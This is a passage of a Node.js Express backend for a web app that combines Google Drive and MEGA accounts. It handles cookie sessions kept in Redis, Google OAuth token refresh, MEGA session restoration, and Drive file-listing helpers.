const express = require("express")
const axios = require("axios")
const cors = require("cors")
const path = require("path")
const multer = require("multer")
const busboy = require("busboy")
const mega = require("megajs")
const crypto = require("crypto")
require("dotenv").config()

const app = express()
//multer buffers in memory, so this cap is about this process's RAM. Only MEGA uploads
//come through here now, and only ones under the client's 50 MB streaming threshold.
const MULTER_MAX_BYTES = 100 * 1024 * 1024
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: MULTER_MAX_BYTES }
})

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

//static assets never need a session, so skip the session store round trip for them.
//this keeps one browser tab from creating a dozen throwaway sessions (and a dozen
//Set-Cookie headers racing each other) while the first page load fetches css/js/images.
const SESSIONLESS_ASSET_RE = /\.(?:css|js|mjs|map|png|jpe?g|gif|webp|avif|svg|ico|woff2?|ttf|eot|txt|xml|webmanifest)$/i

function isSessionlessPath(req) {
  const p = String(req.path || "")
  if (p.startsWith("/images/")) return true
  if (p.startsWith("/css/")) return true
  if (p.startsWith("/js/")) return true
  return SESSIONLESS_ASSET_RE.test(p)
}

app.use(async (req, res, next) => {
  if (isSessionlessPath(req)) return next()
  try {
    //every response below depends on the md_sid cookie, so it must never be cached
    //by the Vercel CDN or a proxy. a cached empty response is what makes the home
    //screen look like "no accounts connected" even though the session has accounts.
    res.setHeader("Cache-Control", "private, no-store, max-age=0")
    res.setHeader("Vary", "Cookie")
    await getOrCreateSession(req, res)
    res.on("finish", () => {
      if (typeof req.saveUserSession === "function") {
        req.saveUserSession().catch(() => { })
      }
    })
    next()
  } catch (err) {
    next(err)
  }
})

//routes that talk to the Google Drive API with account.token. renewing an expiring
//access token in one place keeps every one of them working after the first hour.
const GOOGLE_API_PATHS = new Set([
  "/storage",
  "/files",
  "/open-file",
  "/search",
  "/delete-item",
  "/copy-item",
  "/move-item",
  "/create-folder",
  "/upload-session",
  "/upload-item",
  "/upload-item-stream"
])

app.use(async (req, res, next) => {
  if (!req.userSession || !GOOGLE_API_PATHS.has(req.path)) return next()
  try {
    await ensureFreshGoogleTokens(req)
  } catch (e) {
    //a failed refresh is reported per account by the route itself.
  }
  next()
})

app.use((req, res, next) => {
  if (req.path === "/upload-item-stream" || req.path === "/upload-item") {
    //an upload that goes through this process is not bound by the API timeouts.
    req.setTimeout(2 * 60 * 60 * 1000)
    res.setTimeout(2 * 60 * 60 * 1000)
  }
  next()
})

function setStaticCacheHeaders(res, filePath) {
  //html carries the Set-Cookie for a brand new session, so it must stay uncached.
  if (/\.html?$/i.test(String(filePath || ""))) {
    res.setHeader("Cache-Control", "private, no-store, max-age=0")
  }
}

app.use(express.static(path.join(__dirname, "public"), { setHeaders: setStaticCacheHeaders }))
app.use("/images", express.static(path.join(__dirname, "images")))
//this is credenstial value you can set via .env file or enviroment varialable
const CLIENT_ID = process.env.CLIENT_ID
const CLIENT_SECRET = process.env.CLIENT_SECRET
//this is redirect uri change this if you are self deploying
//only an explicitly configured value is used. the old hardcoded fallback pointed every
//deployment at multi-drives.vercel.app, so a fork, a preview URL or a renamed project
//sent Google's redirect to a different host - a different host means a different
//session cookie, so the callback landed with no oauth state and the account was lost.
//with no env var set the callback URL is derived from the incoming request instead.
const REDIRECT_URI = String(process.env.GOOGLE_REDIRECT_URI || "").trim()
const MEGA_SESSION_TOKEN = process.env.MEGA_SESSION_TOKEN || ""
const MEGA_ACCOUNT_EMAIL = process.env.MEGA_ACCOUNT_EMAIL || ""
const GOOGLE_OAUTH_SCOPE = ["openid", "email", "profile", "https://www.googleapis.com/auth/drive"].join(" ")

//all the Google Drive API endpoints we will be using
const GOOGLE_TOKEN_URL = "https://oauth2.googleapis.com/token"
const GOOGLE_PROFILE_URL = "https://www.googleapis.com/oauth2/v2/userinfo"
const DRIVE_FILES_URL = "https://www.googleapis.com/drive/v3/files"
const DRIVE_DRIVES_URL = "https://www.googleapis.com/drive/v3/drives"
const DRIVE_ABOUT_URL = "https://www.googleapis.com/drive/v3/about?fields=user(emailAddress,displayName,photoLink),storageQuota"
const DRIVE_UPLOAD_URL = "https://www.googleapis.com/upload/drive/v3/files"
const FOLDER_MIME = "application/vnd.google-apps.folder"
const DRIVE_FILES_FIELDS = "nextPageToken, files(id, name, mimeType, size, modifiedTime, webViewLink, iconLink, thumbnailLink, parents, driveId)"


let megaStorage = null
const uploadProgress = new Map()
const sessions = new Map()
const SESSION_COOKIE_NAME = "md_sid"
const SESSION_TTL_MS = 30 * 24 * 60 * 60 * 1000
const SESSION_CLEANUP_MS = 60 * 60 * 1000
const UPSTASH_REDIS_REST_URL = String(process.env.UPSTASH_REDIS_REST_URL || "").trim().replace(/\/+$/, "")
const UPSTASH_REDIS_REST_TOKEN = String(process.env.UPSTASH_REDIS_REST_TOKEN || "").trim()
const HAS_UPSTASH = !!(UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN)
const SESSION_KEY_PREFIX = "multidrive:sess:"

//Vercel (and any other serverless host) throws the whole node process away between
//requests, so anything kept only in module memory is gone by the next request.
//that is why HAS_UPSTASH is mandatory there: without it accounts vanish the moment
//the OAuth redirect lands on a different lambda instance.
const IS_SERVERLESS = !!(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME || process.env.NOW_REGION)
const STORAGE_ACCOUNT_TIMEOUT_MS = Number(process.env.STORAGE_ACCOUNT_TIMEOUT_MS || 7000)
//Vercel buffers the entire request body before the function starts and rejects anything
//over ~4.5 MB with its own error page, so an upload proxied through this process can never
//be larger than that on the hosted site. Google uploads dodge the limit entirely by going
//browser -> Google; MEGA cannot, so the browser is told the cap up front and can say so.
const PROXY_UPLOAD_MAX_BYTES = Number(
  process.env.PROXY_UPLOAD_MAX_BYTES || (IS_SERVERLESS ? 4 * 1024 * 1024 : 10 * 1024 * 1024 * 1024)
)
//kept just under the 10s function limit of the Vercel hobby plan so the browser gets a
//readable JSON error instead of the platform's HTML timeout page.
const MEGA_LOGIN_TIMEOUT_MS = Number(process.env.MEGA_LOGIN_TIMEOUT_MS || (IS_SERVERLESS ? 9000 : 60000))
const GOOGLE_TOKEN_SKEW_MS = 60 * 1000

if (IS_SERVERLESS && !HAS_UPSTASH) {
  console.error(
    "[multi-drive] FATAL CONFIG: running on a serverless host without UPSTASH_REDIS_REST_URL / UPSTASH_REDIS_REST_TOKEN. " +
    "Sessions will be stored in per-instance memory and connected accounts will disappear between requests. " +
    "Set both env vars in the Vercel project settings and redeploy."
  )
}

function parseCookies(header) {
  const out = {}
  const raw = String(header || "")
  if (!raw) return out
  raw.split(";").forEach((part) => {
    const i = part.indexOf("=")
    if (i <= 0) return
    const key = part.slice(0, i).trim()
    const val = part.slice(i + 1).trim()
    if (!key) return
    out[key] = decodeURIComponent(val)
  })
  return out
}

function makeSessionId() {
  return crypto.randomBytes(24).toString("base64url")
}

function createEmptySession(sid) {
  return {
    id: sid,
    createdAt: Date.now(),
    lastSeenAt: Date.now(),
    accounts: [],
    oauthStates: {}
  }
}

function sanitizeAccountForStore(account) {
  if (!account || typeof account !== "object") return null
  const base = {
    provider: normalizeProvider(account.provider),
    email: normalizeEmail(account.email)
  }
  if (!base.provider || !base.email) return null
  if (base.provider === "mega") {
    return {
      ...base,
      megaSessionToken: typeof account.megaSessionToken === "string" ? account.megaSessionToken : ""
    }
  }
  //keep the refresh token plus the user's own oauth client credentials: a Google
  //access token dies after ~1 hour and without these three fields the account can
  //never be refreshed, which is what made cards silently disappear.
  return {
    ...base,
    token: typeof account.token === "string" ? account.token : "",
    refreshToken: typeof account.refreshToken === "string" ? account.refreshToken : "",
    clientId: typeof account.clientId === "string" ? account.clientId : "",
    clientSecret: typeof account.clientSecret === "string" ? account.clientSecret : "",
    expiresAt: Number(account.expiresAt || 0) || 0
  }
}

function sanitizeSessionForStore(session) {
  const source = session || {}
  const oauthStates = source.oauthStates && typeof source.oauthStates === "object" ? source.oauthStates : {}
  const nextOauthStates = {}
  for (const key of Object.keys(oauthStates)) {
    const item = oauthStates[key]
    if (!item || typeof item !== "object") continue
    const clientId = String(item.clientId || "").trim()
    const clientSecret = String(item.clientSecret || "").trim()
    const redirectUri = String(item.redirectUri || "").trim()
    const createdAt = Number(item.createdAt || 0)
    if (!clientId || !clientSecret || !redirectUri || !createdAt) continue
    nextOauthStates[key] = { clientId, clientSecret, redirectUri, createdAt }
  }

  const safeAccounts = (Array.isArray(source.accounts) ? source.accounts : [])
    .map(sanitizeAccountForStore)
    .filter(Boolean)

  return {
    id: String(source.id || ""),
    createdAt: Number(source.createdAt || Date.now()),
    lastSeenAt: Number(source.lastSeenAt || Date.now()),
    accounts: safeAccounts,
    oauthStates: nextOauthStates
  }
}

const REDIS_TIMEOUT_MS = 5000

async function redisSetJson(key, value, ttlSec) {
  const url = `${UPSTASH_REDIS_REST_URL}/set/${encodeURIComponent(key)}`
  await axios.post(url, value, {
    headers: {
      Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}`,
      "Content-Type": "application/json"
    },
    params: { EX: String(ttlSec) },
    timeout: REDIS_TIMEOUT_MS
  })
}

async function redisGetJson(key) {
  const url = `${UPSTASH_REDIS_REST_URL}/get/${encodeURIComponent(key)}`
  const response = await axios.get(url, {
    headers: { Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}` },
    timeout: REDIS_TIMEOUT_MS
  })
  const value = response?.data?.result
  if (!value) return null
  try {
    return JSON.parse(value)
  } catch (e) {
    return null
  }
}

async function redisDel(key) {
  const url = `${UPSTASH_REDIS_REST_URL}/del/${encodeURIComponent(key)}`
  await axios.post(url, null, {
    headers: { Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}` },
    timeout: REDIS_TIMEOUT_MS
  })
}

async function loadSessionById(sid) {
  if (!sid) return null
  if (!HAS_UPSTASH) return sessions.get(sid) || null

  try {
    const payload = await redisGetJson(SESSION_KEY_PREFIX + sid)
    if (!payload || typeof payload !== "object") {
      //not in Redis (expired or never written). the in-memory mirror can still have
      //it when the same warm instance handled the write.
      return sessions.get(sid) || null
    }
    const safe = sanitizeSessionForStore(payload)
    sessions.set(sid, safe)
    return safe
  } catch (err) {
    //never turn a Redis hiccup into a 500 for the whole site.
    console.error("[multi-drive] session load failed:", err.response?.data || err.message)
    return sessions.get(sid) || null
  }
}

async function saveSession(session) {
  if (!session || !session.id) return
  const safe = sanitizeSessionForStore(session)
  //always keep the memory mirror so a warm instance survives a Redis outage.
  sessions.set(safe.id, safe)
  if (!HAS_UPSTASH) return

  try {
    await redisSetJson(SESSION_KEY_PREFIX + safe.id, safe, Math.floor(SESSION_TTL_MS / 1000))
  } catch (err) {
    console.error("[multi-drive] session save failed:", err.response?.data || err.message)
    throw err
  }
}

function buildSessionCookie(req, sid) {
  const parts = [
    `${SESSION_COOKIE_NAME}=${encodeURIComponent(sid)}`,
    "Path=/",
    "HttpOnly",
    //Lax is required (not Strict): the Google OAuth callback is a cross-site
    //top-level redirect and a Strict cookie would not be sent with it, which loses
    //the oauth state and the freshly connected account.
    "SameSite=Lax",
    `Max-Age=${Math.floor(SESSION_TTL_MS / 1000)}`
  ]
  const proto = String(req.headers["x-forwarded-proto"] || req.protocol || "").split(",")[0].trim()
  if (proto === "https") parts.push("Secure")
  return parts.join("; ")
}

//content fingerprint, ignoring lastSeenAt. used to skip pointless writes: the Upstash
//free tier has a daily command budget, and once it is exhausted every session write
//fails - which looks exactly like "the site forgot my accounts".
const SESSION_TOUCH_INTERVAL_MS = 24 * 60 * 60 * 1000

function sessionFingerprint(session) {
  const safe = sanitizeSessionForStore(session)
  safe.lastSeenAt = 0
  return JSON.stringify(safe)
}

async function getOrCreateSession(req, res) {
  const cookies = parseCookies(req.headers?.cookie)
  let sid = String(cookies[SESSION_COOKIE_NAME] || "").trim()
  let session = sid ? await loadSessionById(sid) : null
  const isNewSession = !session

  if (!session) {
    sid = makeSessionId()
    session = createEmptySession(sid)
  }
  const loadedFingerprint = sessionFingerprint(session)
  const loadedLastSeenAt = Number(session.lastSeenAt || 0)
  session.lastSeenAt = Date.now()

  //re-send the cookie on every request, not only on creation, so the 30 day window
  //keeps sliding and a browser that dropped the cookie gets it back.
  res.append("Set-Cookie", buildSessionCookie(req, sid))

  req.sessionId = sid
  req.userSession = session
  req.saveUserSession = async (options = {}) => {
    const changed = sessionFingerprint(req.userSession) !== loadedFingerprint
    const stale = Date.now() - loadedLastSeenAt > SESSION_TOUCH_INTERVAL_MS
    if (!options.force && !changed && !stale) return
    req.userSession.lastSeenAt = Date.now()
    await saveSession(req.userSession)
  }

  if (isNewSession) {
    //persist immediately. on Vercel the lambda can be frozen the instant the response
    //is flushed, so a save queued on res "finish" is not guaranteed to run - and an
    //unsaved session id means the very next request starts over with an empty account list.
    try {
      await saveSession(session)
    } catch (e) {
      //already logged in saveSession; the memory mirror still holds it.
    }
  }
}

function cleanupSessions() {
  if (HAS_UPSTASH) return
  const now = Date.now()
  for (const [sid, session] of sessions.entries()) {
    if (!session || now - Number(session.lastSeenAt || 0) > SESSION_TTL_MS) {
      sessions.delete(sid)
    }
  }
}

setInterval(cleanupSessions, SESSION_CLEANUP_MS).unref()

function setUploadProgress(id, patch) {
  if (!id) return
  const now = Date.now()
  const prev = uploadProgress.get(id) || {}
  const next = {
    ...prev,
    ...patch,
    updatedAt: now
  }

  if (!next.startedAt) {
    next.startedAt = now
  }

  const uploaded = Number(next.bytesUploaded || 0)
  const total = Number(next.bytesTotal || 0)
  const elapsedSec = Math.max(0.001, (now - Number(next.startedAt || now)) / 1000)
  const avgBps = uploaded > 0 ? (uploaded / elapsedSec) : 0
  next.avgBps = Number.isFinite(avgBps) ? avgBps : 0
  next.etaSec = avgBps > 0 && total > uploaded ? Math.ceil((total - uploaded) / avgBps) : 0

  const finalState = { ...next }
  if (HAS_UPSTASH) {
    //megajs emits a progress event per chunk, and mirroring every one of them would burn
    //thousands of Upstash commands on a single upload. Only status changes and one write
    //per second reach Redis; the browser polls every 300ms, so it loses nothing that
    //matters and the daily command quota survives.
    const changedPhase = prev.status !== finalState.status || prev.phase !== finalState.phase
    if (changedPhase || now - Number(prev.redisWrittenAt || 0) >= 1000) {
      finalState.redisWrittenAt = now
      redisSetJson(`multidrive:progress:${id}`, finalState, 5 * 60).catch(() => { })
    }
  }
  uploadProgress.set(id, finalState)
}

function cleanupUploadProgress(id, delayMs = 5 * 60 * 1000) {
  if (!id) return
  setTimeout(() => {
    uploadProgress.delete(id)
    if (HAS_UPSTASH) {
      redisDel(`multidrive:progress:${id}`).catch(() => { })
    }
  }, delayMs)
}


function normalizeProvider(value) {
  return String(value || "").trim().toLowerCase()
}

function normalizeEmail(value) {
  return String(value || "").trim().toLowerCase()
}

function makeAccountKey(provider, email) {
  return normalizeProvider(provider) + "::" + normalizeEmail(email)
}
// Upsert account by provider and email

function upsertAccount(session, account) {
  if (!session) return
  const key = makeAccountKey(account.provider, account.email)
  const current = Array.isArray(session.accounts) ? session.accounts : []
  session.accounts = current.filter((item) => makeAccountKey(item.provider, item.email) !== key)
  session.accounts.push(account)
}

function exportSessionAccountsForClient(session) {
  const list = Array.isArray(session?.accounts) ? session.accounts : []
  return list.map((account) => {
    const provider = normalizeProvider(account.provider)
    const email = normalizeEmail(account.email)
    if (provider === "mega") {
      return {
        provider,
        email,
        megaSessionToken: typeof account.megaSessionToken === "string" ? account.megaSessionToken : ""
      }
    }
    return {
      provider,
      email,
      token: typeof account.token === "string" ? account.token : ""
    }
  }).filter((item) => item.email && item.provider)
}

//run a promise with a hard deadline. serverless functions get killed by the platform
//(10s on the Vercel hobby plan) and a killed function returns an HTML error page that
//the front end cannot parse, so every slow call needs its own budget.
function withTimeout(promise, ms, label) {
  let timer = null
  const guard = new Promise((_resolve, reject) => {
    timer = setTimeout(() => {
      const err = new Error(`${label || "Operation"} timed out after ${ms}ms`)
      err.isTimeout = true
      reject(err)
    }, ms)
    if (typeof timer.unref === "function") timer.unref()
  })
  return Promise.race([promise, guard]).finally(() => {
    if (timer) clearTimeout(timer)
  })
}

function isGoogleAccount(account) {
  return normalizeProvider(account?.provider) === "google"
}

function googleTokenLooksExpired(account) {
  const expiresAt = Number(account?.expiresAt || 0)
  if (!expiresAt) return false
  return Date.now() + GOOGLE_TOKEN_SKEW_MS >= expiresAt
}

function sessionNeedsGoogleRefresh(session) {
  const accounts = Array.isArray(session?.accounts) ? session.accounts : []
  return accounts.some((account) => {
    if (!isGoogleAccount(account)) return false
    if (!account.refreshToken || !account.clientId || !account.clientSecret) return false
    return googleTokenLooksExpired(account) || !account.token
  })
}

//Google access tokens live for about an hour. the refresh token plus the user's own
//oauth client id/secret are stored with the account so the server can mint a new one
//instead of showing an empty home screen.
async function refreshGoogleAccount(account) {
  if (!isGoogleAccount(account)) return false
  if (!account.refreshToken || !account.clientId || !account.clientSecret) return false

  const body = new URLSearchParams({
    client_id: account.clientId,
    client_secret: account.clientSecret,
    refresh_token: account.refreshToken,
    grant_type: "refresh_token"
  })

  const response = await axios.post(GOOGLE_TOKEN_URL, body.toString(), {
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    timeout: 10000
  })

  const accessToken = response.data?.access_token
  if (!accessToken) return false

  account.token = accessToken
  account.expiresAt = Date.now() + (Number(response.data?.expires_in || 3600) * 1000)
  if (typeof response.data?.refresh_token === "string" && response.data.refresh_token) {
    account.refreshToken = response.data.refresh_token
  }
  return true
}

async function ensureFreshGoogleTokens(req) {
  const session = req?.userSession
  if (!session || !sessionNeedsGoogleRefresh(session)) return

  const accounts = Array.isArray(session.accounts) ? session.accounts : []
  let changed = false

  await Promise.all(accounts.map(async (account) => {
    if (!isGoogleAccount(account)) return
    if (!googleTokenLooksExpired(account) && account.token) return
    try {
      if (await refreshGoogleAccount(account)) changed = true
    } catch (err) {
      logError(err)
      //leave the stale token in place; the per-account error path reports it as
      //"reconnect needed" instead of hiding the whole account list.
    }
  }))

  if (changed && typeof req.saveUserSession === "function") {
    try {
      await req.saveUserSession()
    } catch (e) { }
  }
}

function parseMegaSessionToken(raw) {
  if (!raw || typeof raw !== "string") return null

  const text = raw.trim()
  if (!text) return null

  const attempts = [text]
  try {
    attempts.push(Buffer.from(text, "base64").toString("utf8"))
  } catch (e) { }

  for (const candidate of attempts) {
    try {
      const parsed = JSON.parse(candidate)
      if (parsed && typeof parsed === "object" && parsed.sid && parsed.key) {
        return parsed
      }
    } catch (e) { }
  }

  return null
}

function buildMegaEmail(storage) {
  if (typeof MEGA_ACCOUNT_EMAIL === "string" && MEGA_ACCOUNT_EMAIL.trim()) {
    return MEGA_ACCOUNT_EMAIL.trim()
  }
  if (storage && storage.options && typeof storage.options.email === "string" && storage.options.email.trim()) {
    return storage.options.email.trim()
  }
  if (storage && typeof storage.user === "string" && storage.user.trim()) {
    return "mega:" + storage.user.trim()
  }
  return "mega-account"
}

function getFirstNameFromEmail(email) {
  const raw = normalizeEmail(email)
  if (!raw || !raw.includes("@")) return ""

  const local = raw.split("@")[0].replace(/[._+\-]+/g, " ").trim()
  if (!local) return ""

  const token = local.split(/\s+/).find(Boolean) || ""
  if (!token) return ""

  return token.charAt(0).toUpperCase() + token.slice(1)
}

function getFirstNameFromDisplayName(name) {
  const raw = String(name || "").trim()
  if (!raw) return ""

  const first = raw.split(/\s+/).find(Boolean) || ""
  const normalized = first.toLowerCase()
  if (normalized === "mega" || normalized === "google" || normalized === "drive") {
    return ""
  }
  return first
}

function normalizeMegaNode(node, parentId) {
  const isFolder = !!node.directory
  const timestampMs = Number.isFinite(node.timestamp) ? Number(node.timestamp) * 1000 : null
  return {
    id: String(node.nodeId || ""),
    name: node.name || "(unnamed)",
    mimeType: isFolder ? FOLDER_MIME : "application/octet-stream",
    size: isFolder ? null : Number(node.size || 0),
    modifiedTime: timestampMs ? new Date(timestampMs).toISOString() : null,
    webViewLink: null,
    iconLink: null,
    thumbnailLink: null,
    parents: parentId ? [parentId] : [],
    driveId: null
  }
}

function getBodyTrimmed(req, key) {
  const value = req.body?.[key]
  return typeof value === "string" ? value.trim() : ""
}

function getBodyRaw(req, key) {
  const value = req.body?.[key]
  return typeof value === "string" ? value : ""
}

function getQueryTrimmed(req, key) {
  const value = req.query?.[key]
  return typeof value === "string" ? value.trim() : ""
}

function resolveRedirectUri(req) {
  if (REDIRECT_URI) return REDIRECT_URI
  //x-forwarded-* can be a comma separated chain behind more than one proxy.
  const proto = String(req.headers["x-forwarded-proto"] || req.protocol || "http").split(",")[0].trim()
  const host = String(req.headers["x-forwarded-host"] || req.get("host") || "").split(",")[0].trim()
  return `${proto}://${host}/auth/google/callback`
}

function makeOAuthStateToken() {
  return "g_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 10)
}

function cleanupOAuthStates(session) {
  if (!session || !session.oauthStates) return
  const states = session.oauthStates && typeof session.oauthStates === "object" ? session.oauthStates : {}
  const now = Date.now()
  for (const key of Object.keys(states)) {
    const value = states[key]
    if (!value || now - Number(value.createdAt || 0) > 15 * 60 * 1000) {
      delete states[key]
    }
  }
  session.oauthStates = states
}

function authHeaders(token) {
  return { Authorization: `Bearer ${token}` }
}

function logError(err) {
  console.log(err.response?.data || err.message)
}

function sendErrorJson(res, err, fallbackMessage) {
  logError(err)
  const status = err.response?.status || 500
  const googleError = err.response?.data?.error

  //give the short actionable version of the known Google failures (Drive API disabled,
  //rate limit, dead token) here too, so browsing and uploading report the same fix as
  //the account card instead of Google's 300 character paragraph.
  if (googleError) {
    const classified = classifyGoogleApiError(err)
    if (classified.kind !== "other") {
      return res.status(status).json({
        error: classified.message + (classified.helpUrl ? " " + classified.helpUrl : ""),
        needsReauth: classified.needsReauth,
        helpUrl: classified.helpUrl
      })
    }
  }

  const message = googleError?.message || fallbackMessage
  res.status(status).json({ error: message })
}

function getAccountByEmail(session, email, provider) {
  if (!session) return null
  const target = normalizeEmail(email)
  const targetProvider = normalizeProvider(provider)
  const accounts = Array.isArray(session.accounts) ? session.accounts : []

  return accounts.find((account) => {
    const sameEmail = normalizeEmail(account.email) === target
    if (!sameEmail) return false
    if (!targetProvider) return true
    return normalizeProvider(account.provider) === targetProvider
  })
}

function getMegaNodeById(storage, nodeId) {
  if (!storage || !storage.files || !nodeId) return null
  return storage.files[nodeId] || null
}

//megajs keeps a "keepalive" long poll open after every request (api.pull -> api.wait).
//on a serverless host that socket never closes, the function is billed until the
//platform freezes it, and when the frozen socket finally errors megajs emits an
//"error" event on an EventEmitter nobody listens to - which crashes the whole
//instance and makes unrelated requests fail with a 500. So: keepalive off, and an
//error listener on the api object as a second line of defence.
function hardenMegaStorage(storage) {
  if (!storage) return storage
  try {
    if (storage.options) storage.options.keepalive = false
    if (storage.api) {
      storage.api.keepalive = false
      if (typeof storage.api.on === "function" && storage.api.listenerCount("error") === 0) {
        storage.api.on("error", (err) => {
          console.error("[multi-drive] mega api error:", err?.message || err)
        })
      }
    }
    if (typeof storage.on === "function" && storage.listenerCount("error") === 0) {
      storage.on("error", (err) => {
        console.error("[multi-drive] mega storage error:", err?.message || err)
      })
    }
  } catch (e) { }
  return storage
}

//storage.toJSON() carries the raw login options (email, and on some paths the
//password / 2FA code). Only the key + sid are needed to resume a session, so strip
//the credentials before this string is written to Redis or handed to the browser.
function serializeMegaStorage(storage) {
  if (!storage || typeof storage.toJSON !== "function") return ""
  try {
    const snapshot = storage.toJSON()
    const options = { ...(snapshot.options || {}) }
    delete options.password
    delete options.secondFactorCode
    delete options.email
    options.keepalive = false
    options.autoload = false
    options.autologin = false
    return JSON.stringify({ ...snapshot, options })
  } catch (e) {
    return ""
  }
}

//a warm instance can reuse an already logged in storage instead of re-doing the
//MEGA handshake and full tree download on every single request.
const megaStorageCache = new Map()
const MEGA_STORAGE_CACHE_MAX = 5

function cacheKeyForMegaAccount(account) {
  const token = typeof account?.megaSessionToken === "string" ? account.megaSessionToken : ""
  if (!token) return ""
  return crypto.createHash("sha256").update(token).digest("hex")
}

function getCachedMegaStorage(account) {
  const key = cacheKeyForMegaAccount(account)
  if (!key) return null
  const entry = megaStorageCache.get(key)
  if (!entry) return null
  megaStorageCache.delete(key)
  megaStorageCache.set(key, entry)
  return entry
}

function setCachedMegaStorage(account, storage, treeLoaded) {
  const key = cacheKeyForMegaAccount(account)
  if (!key || !storage) return
  megaStorageCache.set(key, { storage, treeLoaded: !!treeLoaded })
  while (megaStorageCache.size > MEGA_STORAGE_CACHE_MAX) {
    const oldest = megaStorageCache.keys().next().value
    megaStorageCache.delete(oldest)
  }
}

//needTree: only pay for the full file tree download when the caller actually browses
//files. /storage just needs the quota (api "uq"), which works with the sid alone.
async function ensureMegaStorageForAccount(account, options = {}) {
  const needTree = options.needTree !== false
  if (!account || normalizeProvider(account.provider) !== "mega") {
    throw new Error("Invalid MEGA account")
  }

  const finish = async (storage) => {
    hardenMegaStorage(storage)
    if (needTree) {
      //the tree is re-read whenever a caller needs it, so browsing never shows a
      //stale listing. what the cache saves is the session handshake, not the listing.
      await storage.reload(true)
      storage.status = "ready"
    }
    account.storage = storage
    setCachedMegaStorage(account, storage, needTree)
    return storage
  }

  if (account.storage) {
    try {
      return await finish(account.storage)
    } catch (e) {
      account.storage = null
    }
  }

  const cached = getCachedMegaStorage(account)
  if (cached && cached.storage) {
    try {
      return await finish(cached.storage)
    } catch (e) {
      megaStorageCache.delete(cacheKeyForMegaAccount(account))
    }
  }

  const rawSession = account.megaSessionToken
  const parsed = typeof rawSession === "string" ? parseMegaSessionToken(rawSession) : null
  if (parsed) {
    const restored = mega.Storage.fromJSON({
      ...parsed,
      options: { ...(parsed.options || {}), keepalive: false, autoload: false, autologin: false }
    })
    return await finish(restored)
  }

  if (MEGA_SESSION_TOKEN) {
    const fallback = await getMegaStorage()
    account.storage = fallback
    return fallback
  }

  throw new Error("MEGA session expired. Reconnect the account.")
}

function escapeDriveQueryId(id) {
  return String(id).replace(/\\/g, "\\\\").replace(/'/g, "\\'")
}

function escapeDriveContains(value) {
  return String(value).replace(/\\/g, "\\\\").replace(/'/g, "\\'")
}

async function getMegaStorage() {
  if (megaStorage) {
    try {
      if (megaStorage.status === "ready") return megaStorage
      await megaStorage.reload(true)
      megaStorage.status = "ready"
      return megaStorage
    } catch (e) {
      megaStorage = null
    }
  }

  const parsed = parseMegaSessionToken(MEGA_SESSION_TOKEN)
  if (!parsed) {
    throw new Error("MEGA_SESSION_TOKEN is missing or invalid. Use JSON from storage.toJSON() or its base64.")
  }

  const storage = mega.Storage.fromJSON({
    ...parsed,
    options: { ...(parsed.options || {}), keepalive: false, autoload: false, autologin: false }
  })
  hardenMegaStorage(storage)
  await storage.reload(true)
  storage.status = "ready"
  megaStorage = storage
  return storage
}

async function connectMegaAccount(session) {
  const storage = await getMegaStorage()
  const email = buildMegaEmail(storage)
  upsertAccount(session, {
    provider: "mega",
    email,
    storage,
    megaSessionToken: serializeMegaStorage(storage) || MEGA_SESSION_TOKEN
  })
  return email
}

async function connectMegaAccountWithCredentials(session, { email, password, secondFactorCode }) {
  if (!email || !password) {
    throw new Error("MEGA email and password are required")
  }

  const storage = new mega.Storage({
    email: String(email).trim(),
    password: String(password),
    secondFactorCode: secondFactorCode ? String(secondFactorCode).trim() : undefined,
    autoload: true,
    autologin: true,
    //no background long poll: see hardenMegaStorage for why this matters on Vercel.
    keepalive: false
  })
  hardenMegaStorage(storage)

  //MEGA login + first tree download is the slowest thing this app does. give it a
  //deadline so the request answers with a real error instead of being killed by the
  //platform (which returns an HTML page the front end cannot parse).
  await withTimeout(storage.ready, MEGA_LOGIN_TIMEOUT_MS, "MEGA login")
  hardenMegaStorage(storage)

  const accountEmail = normalizeEmail(email)
  const account = {
    provider: "mega",
    email: accountEmail,
    storage,
    megaSessionToken: serializeMegaStorage(storage)
  }
  upsertAccount(session, account)
  setCachedMegaStorage(account, storage, true)
  return accountEmail
}

async function getParentDriveId(accessToken, parentId) {
  if (parentId === "root") return null

  try {
    const response = await axios.get(`${DRIVE_FILES_URL}/${encodeURIComponent(parentId)}`, {
      headers: authHeaders(accessToken),
      params: { fields: "driveId", supportsAllDrives: true }
    })

    const id = response.data.driveId
    return id ? String(id) : null
  } catch (err) {
    logError(err)
    return null
  }
}

function buildListParams(parentId, q, pageToken, driveId, rootMinimal) {
  const params = {
    q,
    pageSize: 1000,
    fields: DRIVE_FILES_FIELDS,
    supportsAllDrives: true
  }

  if (rootMinimal) {
    params.corpora = "user"
    params.includeItemsFromAllDrives = false
  } else {
    params.includeItemsFromAllDrives = true

    if (parentId === "root") {
      params.corpora = "user"
    } else if (driveId) {
      params.corpora = "drive"
      params.driveId = driveId
    } else {
      params.corpora = "user"
    }
  }

  params.orderBy = "folder,name_natural"
  if (pageToken) params.pageToken = pageToken
  return params
}

async function listChildrenInFolder(accessToken, parentId) {
  const escaped = parentId === "root" ? "root" : escapeDriveQueryId(parentId)
  const q = `'${escaped}' in parents and trashed=false`
  const driveId = parentId === "root" ? null : await getParentDriveId(accessToken, parentId)

  async function fetchAllPages(rootMinimal) {
    const all = []
    let pageToken = null

    do {
      const params = buildListParams(parentId, q, pageToken, driveId, rootMinimal)
      const response = await axios.get(DRIVE_FILES_URL, {
        headers: authHeaders(accessToken),
        params
      })
      all.push(...(response.data.files || []))
      pageToken = response.data.nextPageToken || null
    } while (pageToken)

    return all
  }

  try {
    const all = await fetchAllPages(false)
    if (all.length > 0 || parentId !== "root") return all
    return await fetchAllPages(true)
  } catch (err) {
    if (parentId !== "root") throw err
    logError(err)
    return await fetchAllPages(true)
  }
}

async function listSharedDrives(accessToken) {
  const drives = []
  let pageToken = null

  do {
    const params = {
      pageSize: 100,
      fields: "nextPageToken, drives(id, name)"
    }
    if (pageToken) params.pageToken = pageToken

    const response = await axios.get(DRIVE_DRIVES_URL, {
      headers: authHeaders(accessToken),
      params
    })


